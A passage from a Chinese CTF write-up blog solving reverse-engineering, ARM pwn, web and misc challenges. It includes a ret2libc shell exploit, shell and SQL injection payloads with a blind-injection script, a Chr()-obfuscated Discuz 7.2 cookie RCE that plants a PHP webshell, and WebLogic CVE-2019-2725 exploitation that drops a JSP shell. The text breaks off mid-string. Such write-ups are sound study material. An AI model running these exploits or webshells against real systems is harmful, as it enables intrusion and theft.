\n![](http://cdn.anyiblog.top/common/1669638613202-c0690f75-10c6-4014-be2c-caf21a79cf75.png)  \n前面一部分是防调试，主要看loc\\_4011B0函数\n  \n跟进发现大量红色代码，需要修复\n  \n![](http://cdn.anyiblog.top/common/1669638614181-f1038a3c-5539-4e05-bde6-1ea40772a989.png)  \n选中按P，大部分代码修复成功了。\n  \n还需要注意这里花指令也得修复，不然会影响整体代码，对红色部分按U重新定义即可。\n![](http://cdn.anyiblog.top/common/1669638615007-e0096b75-2cd6-4a9a-96dc-b0da048299ae.png)  \n完整代码：\n  \n![](http://cdn.anyiblog.top/common/1669638615904-39d3b0ca-e5f6-4800-b7e8-9cf4fc35fc66.png)  \nsub\\_401050:\n  \n![](http://cdn.anyiblog.top/common/1669638616754-33367bd3-402a-4178-bdd2-ff60f5f7719f.png)  \nsub\\_401130:\n  \n![](http://cdn.anyiblog.top/common/1669638617606-d18edd5b-9e4b-4147-97e0-294663f71fc5.png)  \n这里是一个RC4加密，可以用cyberchef直接梭哈\n  \n比的过程中还不知道是啥加密。。傻乎乎写了脚本，不过好在也是解出来了\n  \n前面的sub\\_401050是用D0g3作为key将v5加密，得到一组数据。后面的sub\\_401130函数是将输入的数据与v5数组的内容进行操作，最后与text比对。\n  \n这边我是用C++得出v5的数据（代码能力太差了python不会写xD），然后把v5的数据放python里进行解密。最后得到flag\n  \n贴下脚本C++\n  \n```\n#include <stdio.h>\n#include <cstring>\n#include <windows.h>\nint sub_401050(char *a1, char *a2, unsigned int a3)\n{\n  char *v3; // esi\n  int v4; // ebx\n  int v5; // esi\n  char *v6; // ecx\n  int v7; // edx\n  unsigned __int8 *v8; // esi\n  int v9; // edi\n  unsigned __int8 v10; // dl\n  unsigned __int8 result; // al\n  bool v12; // zf\n  int v15; // [esp+18h] [ebp-108h]\n  char v16[256]; // [esp+1Ch] [ebp-104h] BYREF\n  \n  \n  v3 = a2;\n  memset(v16, 0, sizeof(v16));\n  v4 = 0;\n  v5 = v3 - v16;\n  do\n  {\n    v6 = &v16[v4];\n    v7 = v4 % a3;\n    v6[v5] = v4++;\n    *v6 = *(TBYTE *)(v7 + a1);\n  }\n  while ( v4 < 256 );\n  v8 = (unsigned __int8 *)a2;\n  v9 = 0;\n  v15 = 256;\n  do\n  {\n    v10 = *v8;\n    v9 = (*v8 + (char)v8[v16 - a2] + v9) % 256;\n    result = a2[v9];\n    *v8++ = result;\n    v12 = v15-- == 1;\n    a2[v9] = v10;\n  }\n  while ( !v12 );\n  return result;\n}\nint main(){\n  unsigned int v1; // [esp+14h] [ebp-338h]\n  int i; // [esp+2Ch] [ebp-320h]\n  int j; // [esp+2Ch] [ebp-320h]\n  char v4[256]; // [esp+30h] [ebp-31Ch] BYREF\n  char v5[256]; // [esp+130h] [ebp-21Ch] BYREF\n  char v6[4]; // [esp+230h] [ebp-11Ch] BYREF\n  char v7[252]; // [esp+234h] [ebp-118h] BYREF\n  CHAR Text[24]; // [esp+330h] [ebp-1Ch] BYREF\n  memset(v5, 0, sizeof(v5));\n  memset(v4, 0, sizeof(v4));\n  memcpy(v6, \"D0g3\", sizeof(v6));\n  memset(v7, 0, sizeof(v7));\n  sub_401050(v6, v5, &v6[strlen(v6) + 1] - &v6[1]);\n  printf(\"[\");\n  for(i=0;i<=255;i++){\n      printf(\"%d,\",v5[i]);\n  }\n  printf(\"]\");\n}\n```\n  \n![](http://cdn.anyiblog.top/common/1669638618383-60e0b464-3f84-4e54-b712-7d17d6790018.png) \n \n得到v5数组，最后代到python处理。\n  \n```\nv5 = [68,52,90,-85,-63,-111,-2,-114,-38,-67,46,108,-68,22,110,-117,92,69,-18,-76,-87,85,-37,87,-77,-4,125,-65,23,61,-10,47,-22,53,-115,50,3,-86,-73,-121,-13,18,114,44,-108,6,118,-49,103,-6,-29,-81,-17,102,-36,109,-72,19,98,-88,-74,120,-21,100,119,89,-46,72,-122,-51,122,-12,123,-104,121,-59,105,27,77,-89,99,-97,-14,0,-109,-112,-60,93,64,48,14,84,-79,-52,-35,-128,96,-15,-70,-127,10,-123,-99,104,8,-64,5,-75,-42,-105,-20,36,60,127,111,-48,-120,-78,-41,95,-95,-91,-9,112,80,7,-125,78,12,-33,-56,-23,86,-50,28,-98,66,1,113,-80,-8,74,-110,-40,42,-107,-102,21,-24,-58,-93,70,71,-100,-82,51,39,57,17,106,-32,-30,43,83,-7,82,-71,-19,76,75,-96,54,40,115,55,-57,9,-31,-90,-126,41,79,15,45,62,-34,-62,-44,-28,31,4,91,30,-11,-61,-101,116,25,-83,-39,67,-5,-1,-26,101,73,-45,11,97,-119,-54,-94,59,37,126,-106,65,-47,-124,-92,20,-55,13,29,107,-113,58,-116,26,56,88,34,35,-43,24,38,81,-27,-103,63,-25,2,-69,-118,-66,33,-3,32,117,49,-84,-53,94,16,124,-16]\nls = [86,97,99,-92,34,-92,80,125,-51,-115,19,61,74,79,13,98,-120,-85,-4,-23,-69,30,-96,-112]\nres = ['']*256\na2 = v5\na3 = 256\nresult = 0\nv4 = 0\nv8 = a2\n  \n  \nfor i in range(a3):\n    try:\n        v4 = v4+1%256\n        v6 = a2[v4]\n        result = (v6+result) %256\n        v8[v4] = a2[result]\n        v8[result] = v6\n        res[i] = ls[i] ^ v8[v8[v4]+v6]\n    except:\n        pass\nfor i in res:\n    try:\n        print(chr(i),end='')\n    except:\n        pass\n#d0g3{This_15_FindWind0w}\n```\n  \n运行得到flag\n  \nd0g3{This\\_15\\_FindWind0w}\n  \n# Pwn\n  \n### babyarm\n  \narm架构32位的题目，其溢出手法值得学习。\n  \n题目提供了libc。\n  \n![](http://cdn.anyiblog.top/common/1669638619281-71bc9ea4-9fbd-4569-84ea-d9474a20fc4a.png)  \n前面就是正常的接收，进行一个base64加密的处理。\n  \n当加密的数据为 **Sp5jS6mpH6LZC6GqSWe=** 时，则给你一次栈溢出的机会。\n  \n这题没后门，可以做ret2libc也可以ret2shellcode。\n  \n前面需要注意下这个base64解密得不到正常数据，得跟进到加密的函数看其操作。\n  \n跟进sub\\_10668的byte\\_10CCC数组\n  \n![](http://cdn.anyiblog.top/common/1669638620243-475ef3b7-d912-4398-9708-fb191e0609c8.png)  \n![](http://cdn.anyiblog.top/common/1669638621197-1824e3a1-ac0f-42da-88db-f94992f1cee9.png)  \n能发现这里base64是换表了，正常的应该是A-za-z0-9+/才对，所以正常解密解不出来。\n  \n跑一下换表脚本即可（有点逆向的感觉……）\n  \n![](http://cdn.anyiblog.top/common/1669638622109-812b86f7-79d8-46fb-998c-4dcb288bb753.png)  \n得到明文为 **s1mpl3Dec0d4r**\n  \n之后就是溢出的操作。\n  \n这里思路是泄露puts地址，然后构造system和bin\\_sh 最后再发一次过去getshell。也就是传统的ret2libc，但是这里arm是通过寄存器传参的，所以要注意传参前加寄存器，构造的手法值得细学。\n  \n贴下参考一位大师傅写的exp：\n  \n```\nfrom pwn import *\n  \n  \ncontext.log_level='debug'\n#p = process(\"./chall\")\np = remote(\"47.108.29.107\",10061)\nelf = ELF(\"./chall\")\nlibc = ELF(\"./libc-2.27.so\")\n  \n  \ndef input_pass():\n    p.sendlineafter(\"msg> \",\"s1mpl3Dec0d4r\")\n  \n  \ndef overflow(payload):\n    p.sendlineafter(\"comment> \",payload)\n  \n  \nputs_got = elf.got[\"puts\"]\nputs_plt = elf.plt[\"puts\"]\nmain_addr = 0x1050C\npop_r3_pc = 0x10464\npop_r4_r5_r6_r7 = 0x10cb0\nmov_r0_r7 = 0x10ca0\n  \n  \ninput_pass()\n  \n  \npayload = b'a'*(0x2c) + p32(pop_r4_r5_r6_r7) + p32(0)*3 + p32(puts_got) + p32(0)*3 + p32(pop_r3_pc) + p32(puts_plt) + p32(mov_r0_r7) + p32(main_addr)*10\n  \n  \noverflow(payload)\n  \n  \nlibc_base = u32(p.recv()[:4])\nlibc_base = libc_base - libc.symbols[\"puts\"]\nsuccess(\"libc base is leaked ==> \" + hex(libc_base))\n  \n  \nsystem_addr = libc_base + libc.symbols[\"system\"]\nbinsh = libc_base + next(libc.search(b'/bin/sh'))\n  \n  \npayload = b'a'*(0x2c) + p32(pop_r4_r5_r6_r7) + p32(0)*3 + p32(binsh) + p32(0)*3 + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_r7) + p32(main_addr)*10\n  \n  \ninput_pass()\noverflow(payload)\n  \n  \np.interactive()\n```\n  \n这题ret2shellcode做可以更简单，因为bss段是可执行的，后面没写shellcode的exp就不继续往下写了。\n  \n![](http://cdn.anyiblog.top/common/1669638622925-79d45823-11c1-4fa1-9eb2-693b04e74786.png) \n \nD0g3{5bdb3a4ed9524be2aa073f06090e95de}","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"弱口令安全实验室招新赛qsnctf题解","url":"/2022/11/19/20221119/","content":"![](http://cdn.anyiblog.top/common/1668766349116-c887c399-6e06-4d7b-a674-ad3f631ac021.jpg)  \n\n排名12 整体题目不算特别难，简单的题好多没做出来，然后后面也没有耐心去看re和pwn了。\n\n再加油吧。\n\n# 口吐芬芳\n\n个人评价是题目分值不怎么合理，一些难的题目分少。\n\n还有就是，题目放的hint我是真觉得没什么作用，你提示了还不如不提示呢，好几个提示都长一样，你要提示就实质性一点 非要讲什么大白话。。\n\nweb难度还行，差一道AK 算简单的一类题。\n\ncrypto好几道古典密码没做出来，有点偏脑洞。\n\nre好几题都是windows程序，IDA基本函数不识别很多看不懂，看得太累了，不会做也不太想做。\n\npwn是自己莼菜，简单题也是有的。\n\n重点表扬一下misc！！套了太多没必要的知识点，比如那一长串hex的压缩包 真没有什么必要。。以及那道图片里的base64 我寻思哪个OCR这么牛逼能识别这么多数据，做完是真的很想骂人，纯恶心。出题人更是重量级，用线程+循环正则匹配就能解决100%，不得不说有点实力。最后出个原神的文字密码我真是大无语。\n\n心情复杂，比完第一时间就是痛骂出题人。。\n\n（认为我说的不对略过这段话就行 大可不用理会）\n\n# Web\n\n### 开胃菜\n\n```\n<?php\nhighlight_file(__FILE__);\nif(strlen($_GET[1]&&$_GET[1]<=5)){\n    echo strlen($_GET[1]);\n    echo '<hr/>';\n    echo shell_exec($_GET[1]);\n}\n  \n?>\n```\n\n直接RCE了，直接传参\n```\n?1=cat /flag\n```\n\nqsnctf{32ca8f37-6d2f-4e91-89c3-7c148f2fb981}\n\n### 签到小能手\n\n![](http://cdn.anyiblog.top/common/1668766349983-44d431e2-cee8-4726-b05e-3315facf946d.jpg)  \n就在index.php，尝试访问其备份文件index.php.bak 发现能下载。得到flag\n\n![](http://cdn.anyiblog.top/common/1668766350359-3a311800-a994-43eb-9dde-b45a77d418bb.jpg)  \nqsnctf{ae2cf82a-90a2-460a-b6bd-ac7466cde0e2}\n\n### 小镇做题家\n\n![](http://cdn.anyiblog.top/common/1668766350814-c90ea882-aebf-4615-8f7a-932c9a805898.jpg)  \n访问robots.txt发现有GAME路径\n\n![](http://cdn.anyiblog.top/common/1668766351165-6b33c8aa-7cf3-4868-93c7-eabce85116d8.jpg)  \ndirb扫描下，发现GAME/index.html\n\n访问发现是一个前端贪吃蛇游戏\n\n![](http://cdn.anyiblog.top/common/1668766351634-1e67be21-cb2a-47a6-8b9f-e08cdf921de5.jpg)  \n直接去找其js文件，发现了base数据\n\n![](http://cdn.anyiblog.top/common/1668766352034-cce5a8ae-b265-42bd-b567-6eee4e6e4b12.jpg)  \n\n![](http://cdn.anyiblog.top/common/1668766352471-941fced3-9be8-4e89-a880-d79c916fc253.jpg)  \n解密得到提示路径\n\n![](http://cdn.anyiblog.top/common/1668766352826-ba6453b9-9cb5-44ad-8f10-51041a5c0bbe.jpg)  \n让我们传一个payload，能读想读的文件\n\n尝试传/etc/passwd 发现读取成功\n![](http://cdn.anyiblog.top/common/1668766353284-48bd8a2d-c89b-4b00-af5e-5b27252dd272.jpg)  \n但尝试输入php://filter读取时却没东西\n![](http://cdn.anyiblog.top/common/1668766353630-82585624-28bb-4764-9c2f-0d3438a2c02f.jpg)  \n说明代码的实现不是用php，可能是直接在shell里面执行，那么用运算符绕过下\n\n```\n1.txt|ls\n```\n\n![](http://cdn.anyiblog.top/common/1668766353984-00aca6d9-0bd5-4be8-a261-4f44567ef54f.jpg)  \n成功执行，尝试cat /flag发现有过滤空格 那么加一个$IFS$9 简单bypass\n\n```\nPayload：?payload=1.txt|cat$IFS$9/fl*\n```\n\n![](http://cdn.anyiblog.top/common/1668766354365-a9484733-93c8-4f57-a5ca-621a6222996f.jpg)  \nqsnctf{16aef423-879d-40af-abec-7484c5dc56f4}\n\n### Discuz\n\nDiscuz社区论坛cms，发现版本为7.2\n\n![](http://cdn.anyiblog.top/common/1668766354763-f53bda15-7581-4939-80f3-c0ab9c36e4e8.jpg)  \n百度搜下漏洞，参考文章：[https://blog.csdn.net/m0\\_65129142/article/details/122061221](https://blog.csdn.net/m0_65129142/article/details/122061221)\n\n```\nURL:viewthread.php?tid=10&extra=page\nCookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();\n```\n\n![](http://cdn.anyiblog.top/common/1668766355200-f674a423-76b1-4565-9aec-c550bfcd6c41.jpg)  \n写一个马利用\n\n```\n#wf.php post:lalala\nGLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))\n```\n\n传参得到flag\n\n![](http://cdn.anyiblog.top/common/1668766355598-4db8a181-a39d-4813-94da-8ef567b4fb82.jpg)\nqsnctf{521407c4-bdd6-41e5-9c68-32878ce2ad17}\n\n\n### Queen\n\n一个登录界面，刚开始先f12看network状况，发现登进去的数据先传进login.php\n\n![](http://cdn.anyiblog.top/common/1668766356232-92001485-ad80-4bdd-81e1-1193a97e9681.jpg)  \n![](http://cdn.anyiblog.top/common/1668766356589-3839dd90-211f-430b-9af6-89e24012f277.jpg)  \n要本地，hackbar头数据加一个X-Forwarded-For:127.0.0.1\n\n发包再看network状态，发现多了一个check.php\n\n![](http://cdn.anyiblog.top/common/1668766356962-b99074e6-269f-4cc4-91a5-8256b1121818.jpg)  \n内容data是一个base64，解密看看\n\n![](http://cdn.anyiblog.top/common/1668766357300-317271a7-5997-423e-ad97-fe1e539ac071.jpg)  \n发现我们传进的数据被base64加密了，user处可能存在sql注入漏洞，那么我们按照格式写好payload再base64编码 最后发送到服务器看看。\n\n同时该请求是一个302重定向，用python requests处理下能看回显\n\n```\nimport requests\nurl = \"http://89f188af-9856-452f-9aed-f4ea82f83339.recruit.qsnctf.com:8080/check.php?data=dXNlcjphYWF8cGFzczphYWE=\"\nheaders = {\"X-Forwarded-For\":\"127.0.0.1\"}\nhttp = requests.get(url,headers=headers,allow_redirects=False)\nprint(http.text)\n```\n\n![](http://cdn.anyiblog.top/common/1668766357644-bb5643bd-6380-4501-9b63-75b87794d487.jpg)  \n构建payload：\n\n```\nuser:admin' and 1=1 #|pass:aaa\n```\n发送发现回显是登陆成功。\n![](http://cdn.anyiblog.top/common/1668766357962-371bcca2-0e63-41f9-acce-b4184cce2306.jpg)  \n\n所以这里是布尔盲注，我们可以用substr截断数据库或表名等字符串，然后再遍历ascii表，用if判断如果为结果为正确则为1，反则为0\n\n这样通过回显就能爆破出数据库、表、字段和里面的内容了。\n\n写了一个脚本，payload换用下即可。\n\n爆出来数据为sql，表名为user，字段有id username password，flag在username字段\n\n```\nimport requests\nimport base64\nimport time\nimport string\n  \n  \ndef main():\n    table = string.printable.strip()\n    res = \"\"\n    i = 1\n    while 1:\n        n = 0\n        while n < len(table):\n            #payload = f\"admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{i},1)='{table[n]}',1,0); #\"  \n            #information_schema,mysql,performance_schema,ctftraining,test,sql\n            #payload = f\"admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1)='{table[n]}',1,0); #\"\n            #flag_table,news,users # limit 1,1\n            #payload = f\"admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctftraining' and table_name='users'),{i},1)='{table[n]}',1,0); #\"\n            payload = f\"admin' and if(substr((select group_concat(password) from sql.user where username='flag'),{i},1)='{table[n]}',1,0); #\"\n            print(payload)\n  \n  \n            payload = \"user:{}|pass:admin\".format(payload)\n            content = base64.b64encode(payload.encode()).decode()\n  \n  \n            url = f\"http://89f188af-9856-452f-9aed-f4ea82f83339.recruit.qsnctf.com:8080/check.php?data={content}\"\n  \n  \n            headers = {\"X-Forwarded-For\":\"127.0.0.1\"}\n  \n  \n            s = requests.Session()\n  \n  \n            http = s.get(url,headers=headers,allow_redirects=False)\n            if \"登陆成功\" in http.text:\n                i += 1\n                res += table[n]\n                break\n            print(res)\n            n += 1\n        if n == len(table):\n            break\nmain()\n```\n\n![](http://cdn.anyiblog.top/common/1668766358300-603216d1-6682-440d-9da5-58368015c19c.jpg)  \nqsnctf{8f55dfd1-4025-4095-96a8-6c7b14c14f91}\n\n### Weblogic\n\n![](http://cdn.anyiblog.top/common/1668766358769-5dc7f0ff-6a27-4c42-9454-1002cd1967d4.jpg)  \n打开题目，如题所述是Weblogic，即weblogic server，版本是10.3\n\n这里的漏洞是CVE-2019-2725 反序列化漏洞\n\n刚开始尝试自己去利用，但自己用有太多的bug了 就用poc利用了。\n\nPOC: [https://github.com/TopScrew/CVE-2019-2725](https://github.com/TopScrew/CVE-2019-2725)\n\n利用poc写一个jsp马\n\n```\npython weblogic-2019-2725.py 10.3.6 http://3fa5ca87-da93-4472-b33d-cd66efd5a816.recruit.qsnctf.com:8080\n```\n\n![](http://cdn.anyiblog.top/common/1668766359136-dde3095e-5107-4907-ac16-dcac9a3d2530.jpg)\nqsnctf{31d1e8e5-ede7-48e4-8f92-cd40a23d8e00}\n\n### Where\n\n一个找网页的题目，都是各种各样的网页。。\n\n访问容器，发现是一个前端网页 对我们做题没帮助\n\n![](http://cdn.anyiblog.top/common/1668766360084-46a22a45-83d7-4a1e-92c1-9c42ca7f3fa9.jpg)  \n尝试搜索robots.txt看看有没有信息\n\n![](http://cdn.anyiblog.top/common/1668766360492-4daa0b63-4977-4dff-9703-a1a040cf96da.jpg)  \n给了一个路径/admin/（吐槽下你不放hint放这种没用的数据是几个意思？？）\n\n访问是一个登录平台，随便登陆下发现url给了下一个路径的提示\n\n![](http://cdn.anyiblog.top/common/1668766361740-367f2158-1fea-4b2d-9534-e5683fab0005.jpg)  \n![](http://cdn.anyiblog.top/common/1668766362191-68efebdf-8519-4d37-86a3-1c276d067bdb.jpg)  \n访问/vendor/有这个路径但不知道里面的文件\n\n![](http://cdn.anyiblog.top/common/1668766362533-fb931da8-90bc-4d03-b7a4-82d55d3c8b10.jpg)  \n尝试百度vendor\n\n![](http://cdn.anyiblog.top/common/1668766362916-a1e88229-a30b-4cf6-b39c-0019c1f09280.jpg)  \n发现了相关的路径，看了下发现这个eval-stdin.php有rce漏洞 \n\nphpunit CVE-2017-9841\n\n漏洞原理是因为该文件执行了php://input这个代码，造成远程代码执行。\n\n这里用burpsuite进行执行代码，用hackbar会执行不了。\n\n![](http://cdn.anyiblog.top/common/1668766363338-b4a8424e-0f9d-4244-b40c-d1cae92eafcc.jpg)  \nqsnctf{26c3ad89-2f03-45b7-aeb8-97a3c6be28b6}\n\n# MISC\n\n### 签到\n\n![](http://cdn.anyiblog.top/common/1668766363700-b4951451-23cc-400f-8191-7909a56d7a01.jpg)  \n根据提示尝试公众号发送linux命令，发现可以执行 cat /flag即可\n\n![](http://cdn.anyiblog.top/common/1668766364033-755a9d2c-96cb-4922-bb57-3c5ac4eb1a99.jpg)  \n\nqsnctf{ba3c9f2e-56a8-416b-bc5d-dd379dede335}\n\n### EasyMisc\n\n![](http://cdn.anyiblog.top/common/1668766364408-152c13a7-1542-43fa-9ee8-191bc8c15aa5.jpg)  \n下载附件得到docx文件，直接改后缀为.zip看word/document.xml文件\n\n![](http://cdn.anyiblog.top/common/1668766364722-c5afd7b0-906a-40b3-a560-17a9965c170e.jpg)  \n发现base64，解密下，得到压缩包的hex值\n\n![](http://cdn.anyiblog.top/common/1668766365144-1544cf88-aa50-4d59-b060-599ec0c974a0.jpg)  \n处理下空格 写到文件里。\n\n![](http://cdn.anyiblog.top/common/1668766365527-f401cd30-9fe0-47a4-bb88-27b233f38f0b.jpg)  \nqsnctf{177af0b9-fbed-4a1e-a09f-4a580940c28c}\n\n### 奇怪又不奇怪\n\n下载附件得到图片：\n\n![](http://cdn.anyiblog.top/common/1668766365937-3fbae3e6-eb6a-4cf9-ae7d-713601e0d857.jpg)  \n能看出来是某种文字密码，但不知道是什么密码。卡了几天想到出题人是OP猜测是原神的文字表（...?）\n\n![](http://cdn.anyiblog.top/common/1668766369436-516c1dfc-eb96-4063-9cc0-2ee35b349243.jpg)  \n对照得到flag\n\nflag{moxiahjack}\n\n脑洞题，题目描述提示了个寂寞。\n\n### ScanQR\n\n下载附件得到QR码\n![](http://cdn.anyiblog.top/common/1668766369818-ab37c499-d322-4010-a8bf-baaa08404657.jpg)  \n很是熟悉，这个是汉信码\n\n![](http://cdn.anyiblog.top/common/1668766370608-e19a78cb-b41f-45f2-96d8-dc49fa7f7c7e.jpg)  \n在线网站识别下，得到百度盘链接\n\n访问能看到又是base\n\n![](http://cdn.anyiblog.top/common/1668766370960-d8fe2405-3ef7-4b90-a431-5f56fdaa1c5b.jpg)  \n复制到basecrack解密下，又是hex值。。无语了这么喜欢hex\n\n![](http://cdn.anyiblog.top/common/1668766371423-a0135d8e-4d34-4dfb-92b8-01fb3c60b31c.jpg)  \n8950是png文件头，winhex同样处理下。\n\n![](http://cdn.anyiblog.top/common/1668766371798-860825a7-0f72-40c3-91dd-530f9a8e81e3.jpg)  \n一张二维码，PS处理下 补全码头再扫描\n\n\n![](http://cdn.anyiblog.top/common/1668766372183-77e1ee7a-189a-41b7-b8fc-5ed7779df30a.jpg)  \n\n![](http://cdn.anyiblog.top/common/1668766372641-71bbd10e-eeb2-4976-a181-7ba375e70f1b.jpg)  \nqsnctf{29a1ea12-8dd3-4eb3-9a9f-c31e8755c565}\n\n### Cookie怎么分\n\n流量分析题，但不完全需要看流量 把文件导出即可\n\n下载附件得到pca流量包，wireshark分析\n![](http://cdn.anyiblog.top/common/1668766373369-65e261a9-7287-49da-ada6-502fcedee18f.jpg)  \n这边http导出全部，然后分析里面的文件\n\n发现有带base64数据，解密看下\n\n![](http://cdn.anyiblog.top/common/1668766373807-ae825c07-5c6b-4983-a2ed-a48d391642f9.jpg)  \n发现得到一半的flag\n\n![](http://cdn.anyiblog.top/common/1668766374148-2582bf44-136f-4582-9c50-34cb7b9e355c.jpg)  \n![](http://cdn.anyiblog.top/common/1668766374582-ed7fffee-0642-4479-add2-8572bbc07b21.jpg)  \n主要分析cookie.jpg这几张图片，能发现存在隐写\n\n本来我认为这几张图片是一样的，所以前面就搞出来一个base11.txt，但后面用binwalk尝试分离的时候又搞出了另一个文本，发现图片是不一样的。\n\ncookie1：\n\n![](http://cdn.anyiblog.top/common/1668766375010-a497bb9f-c1d5-42ba-a112-6240d0e98bdd.jpg)  \ncookie2:\n\n![](http://cdn.anyiblog.top/common/1668766375503-2fbd41fe-3ea5-4e56-8e41-c9e5e29f3426.jpg)  \n分别分离处理。\n\nbase11.txt:\n![](http://cdn.anyiblog.top/common/1668766375921-c6e73b0c-2440-481a-aa11-ed623e9224ea.jpg)又是这个hex值，同样处理下，因为这里数据有点多 所以用python处理下。\n\n```\nimport binascii\nwith open('content.txt','r') as f:\n    content = ''\n    for i in f.read().split('\\n'):\n        content += i.replace(' ','')\n    open('result.zip','wb').write(binascii.unhexlify(content))\n```\n\n得到result.zip 发现有密码\n![](http://cdn.anyiblog.top/common/1668766376350-4cba82d9-a8c9-4b2a-82ea-102607223088.jpg)  \n尝试爆破压缩包密码\n\n![](http://cdn.anyiblog.top/common/1668766376881-c06d8fa7-0429-4926-a6c2-8bb613c424f0.jpg)  \n成功恢复 得到密码20221108\n\n得到图片\n![](http://cdn.anyiblog.top/common/1668766378463-ff69e7e1-70ea-499f-a215-bb9a1370c171.jpg)  \n再看另一个文件\n\nbase00.txt:\n\n同样分离，得到文本\n\n![](http://cdn.anyiblog.top/common/1668766378971-a8a2d322-3436-418b-b482-3e087e7dafff.jpg)  \n再用脚本处理下，得到第二个压缩包，里面同样是一张图片\n\n![](http://cdn.anyiblog.top/common/1668766379429-f056dcf4-f23e-428f-a7b3-2a12f68779c2.jpg)  \n![](http://cdn.anyiblog.top/common/1668766380935-76056fc2-3d95-43ef-bd50-96cf3a1aab7f.jpg)  \n仔细看能发现另一张图片是多一行的，所以这里图片存在高度隐写，爆破下crc得到原图片\n\n![](http://cdn.anyiblog.top/common/1668766382663-d1633f01-a45c-428b-81d8-3b0f461aad77.jpg)  \n现在思路就很明显了，将两张图片的内容合并在一起，通过ocr和手动修改得到这串base64 再解密写到文件里。\n\nps处理合并下。\n\n![](http://cdn.anyiblog.top/common/1668824425315-9caf8673-3854-4f57-8467-91c7a77c47c6.jpg)  \n\n剩下就手动搞，不得不说这题是真套。把我恶心到了，出OCR还非得这么多数据 我起码对了三四个小时才搞好，因为这个base有一个错误图片就显示不完全，总之这种出法我觉得没什么实质意义。\n\n注意事项就是OCR最好半行半行截取，准确率高一点，然后搞出来的数据像1和l 0和O 还有5和S之类的就需要自己手动去一个个对，可以把你写的数据截个图和原图放到ps，然后把原图透明度搞低，然后两张图对比下 这样比较快。\n\n最后贴下脚本\n\n```\nimport binascii\nimport base64\n  \n  \ncontent3 = \"\"\"\niVBORw0KGgoAAAANSUhEUgAAAMEAAAAcCAYAAADY4tttAAANH0lEQVR4nO1aDUhb1x7/7bVEVsijYOmDjD6ax6hSqCskIupaNJPZdqgtU7entlTrWHVvMY6q5dU6Fisz9q1+8KrCagptLPOD1QibymzcipHZCKspryRja8pGAkpCxbwJCZXzzr35vPfGJHbljc384\nBK995z/+Z//+X/8zrn3BUKBBBLYwvjTb61AAgn81kgEQQJbHokgSGDLIxEECWx5JIIggS2PRBAksOXxhwwC70Md6o5lQS6XI7dhEo6IrVzQK+WoG3f9n7WLgXUHDO1VyKW6yw+XoPe+97mJNvdQmT3m5ybvj4LtGz5ZM6Hr7Rro8rRYUKYFb7vG65CvNgqaV1xbgO\npgnKO6TNC2d+DmjA3uHclIO1aLi8oiSHdsVv0I8FK9zw5D2j6F7owkuD0iiDfR3bWghab9JgyP3RDtzkbp+SaoDkt+tVrux0botQO4+bUZrjVQ2WlQVKnQdCIN4m2hdo7bzWh0HMHInBbSp254k0TAsgm6f/f5+4qQfFCBM3VNKD0QNrN1F0zXNej4zADbik/+8bN\nNqHkjhSP/eWHzfuCF6Uoxam4poF1QgfWo+12QV+s2HGNTPhWHvgX9bmqTi1AVSiEKf0giwkNmP84hlafLiKx7kfPEqVcSWccsWX2yyrk8TyNLEuDJHXLhUCZRaheJne1rJ7OflJGc+jFij1dGNHzXSWSHrpLFmA2dZOx9GVHqnaFb1gFSLCsmmm/s7Jyc/xkiSqqr\nxuj5dTp5FsnV02dJpz4wZ0b2GFG/KSPFWotQpy/CdFqdJerXyoh6JNTX/o2G1XPAGhyALHYXkMz6IWJx+nT1/DRLNFR+5Yg9KGqxWyZYz2fFZv3AY9SQnNOVpEzWGVqbpx5Bf/ayUbvLKsnQT89FVb8C1G7fDfjW81vuekYMAkbhzPfHyL3PlQKjLfZlkgLOwm0Or\nPGaJsgq9y5dfKFyzwQmCKjuzpgN+UHABL6MFHzKndvqZAORnR4idqGAXw3752d5uvp06vyO11DgWD5dM/sCa7NIOmW0nym6/OcZBJvyg19oQB5SkjHTGHXuzpgJ6tFnlRF85Png3ifhdvNBuCdYMUB93o6m80X4W6Qy6vVCmrwrZvlxf69HR3U+shhuK89FyXvDsN\nH7dkoLIJHwKEoy0nNfwfC8JbrQFTN0LTUoyZOzfD/rWBU6pgOMn+HSjSg5R8vrXCvy2XG7EGDADM0J7hOKG2lJtvOEW7D4pQhHMlI4d8VyBbIfGGGOunXwwjbdhcaysPk26GBdiz4dj3eVEtIk9m/3fR2aq8ugmQN01b75BfcrgnWgFG8HuxR+7ILkALWAy81p5Xb\nZIXpZSq3LuQvbeAeqArao7ID+R96+I6qdA1OOzw+Y8QxtDbDXN6Hor3E0p3R25KoFpScUXB9xW6Gne6X8w8xeKR9V7XrYwu3rtcHQ04hy/7zkeSVovGEFf0eVtD3cbn5w42SV3PknpSqf+/Iem7U5mYN5zqMQEeAxX2XLtVpvIU4/5Vk0PSJMnrdoC4js41nCz/mW\nTwtiZ/Ani2SMoRSrHraU+mgBr2xGqAQeUycp8NMcplx7lixkqD6HZB4Km8sSk6VotlriD+rPsvzszMOjr4bIrM3powNPGPmZJLPjnmCeLBjdv71KKinNGTCHt9igEghHI0MnZeTCV6Fc6aHzLj5Uxtp8lZZ+y0gDyXmTZt1fwmbCVIJDOeRs3z1iZ+57VkM2tIWJj\n2nn+PyAbfnVBZZVsFR3KXYliFh5n1rIAEMdKf1i9f7lEZn4qJjSv4nQOj99RO6MzJJHSz57rgaoLI9dRKqGnCBwfqHkcHNhEPgWKefo6ySTOoa